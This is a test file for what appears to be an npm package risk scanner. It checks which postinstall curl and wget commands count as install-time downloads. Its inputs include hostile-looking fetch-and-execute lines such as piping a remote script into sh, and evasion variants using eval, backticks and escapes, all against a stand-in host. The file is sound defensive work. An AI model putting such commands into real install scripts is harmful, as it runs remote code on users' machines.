// curl and wget count as install-time network only where they run and fetch: a version or help call, or a literal an
// echo prints, adds nothing. Every other shape keeps the reading it had. Payloads are stand-ins.
import { describe, expect, test } from "bun:test";
import { analyze, finalize, isInlineDownload, type Analysis, type AnalyzeInput } from "../src/index.ts";

function scoreOf(scripts: Record<string, string>) {
  const m: AnalyzeInput["manifest"] = { name: "probe-pkg", version: "1.0.0", license: "MIT", scripts };
  const data = new TextEncoder().encode(JSON.stringify(m));
  const a: Analysis = analyze({ name: "probe-pkg", manifest: m, files: [{ path: "package.json", size: data.length, mode: 0o644, data }], publisher: "a", previousPublishers: [] });
  const r = finalize(a, { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null });

  return { score: r.score, ids: r.signals.map((s) => s.id) };
}

const NETWORK = ["install-download", "install-network", "install-shell"];

describe("a curl or wget that fetches nothing adds no install-time signal", () => {
  const inert = [
    "curl --version",
    "curl -V",
    "wget --version",
    "wget -h",
    "/usr/bin/curl --help",
    "'curl' --version",
    "curl.exe -V",
    "curl --version >/dev/null 2>&1 || echo 'curl is needed'",
    "echo 'Run curl --version to check your tools'",
    'printf "install wget first"',
    "node install.js && curl --version",
  ];

  for (const cmd of inert) {
    test(`postinstall: ${cmd}`, () => {
      const r = scoreOf({ postinstall: cmd });

      for (const id of NETWORK) expect(r.ids).not.toContain(id);
      expect(isInlineDownload(cmd)).toBe(false);
    });
  }

  test("the same call behind npm run -s", () => {
    const r = scoreOf({ postinstall: "npm run -s check", check: "curl --version" });

    for (const id of NETWORK) expect(r.ids).not.toContain(id);
  });
});

describe("every other curl or wget keeps its reading", () => {
  const fetching = [
    "curl -s https://example.invalid/x.sh | sh",
    "curl https://example.invalid/x",
    "wget -q https://example.invalid/x",
    "curl",
    "curl --version && curl -o a https://example.invalid/x",
    "curl --version https://example.invalid/x",
    "curl -K cfg --version",
    "echo curl https://example.invalid/x | sh",
    "echo 'curl https://example.invalid/x' > a.sh && sh a.sh",
    "echo hi; curl -fsSL https://example.invalid/x -o x",
    "eval 'curl https://example.invalid/x'",
    "sh -c 'curl --version'",
    "env curl --version",
    "CURL_HOME=. curl --version",
    "xargs curl < urls",
    "curl --version $(curl https://example.invalid/x)",
    "echo `curl https://example.invalid/x`",
    "\\curl https://example.invalid/x",
    "echo 'unclosed curl https://example.invalid/x",
    "curl --version # https://example.invalid/x",
    "{ curl --version; }",
    "echo 'a | curl https://example.invalid/x'",
    "echo 'see curl' & curl https://example.invalid/x",
    "echo hi ^| curl https://example.invalid/x",
    "echo %CURL% https://example.invalid/x",
  ];

  for (const cmd of fetching) {
    test(`postinstall: ${cmd}`, () => {
      expect(scoreOf({ postinstall: cmd }).ids).toContain("install-download");
      expect(isInlineDownload(cmd)).toBe(true);
    });
  }
});
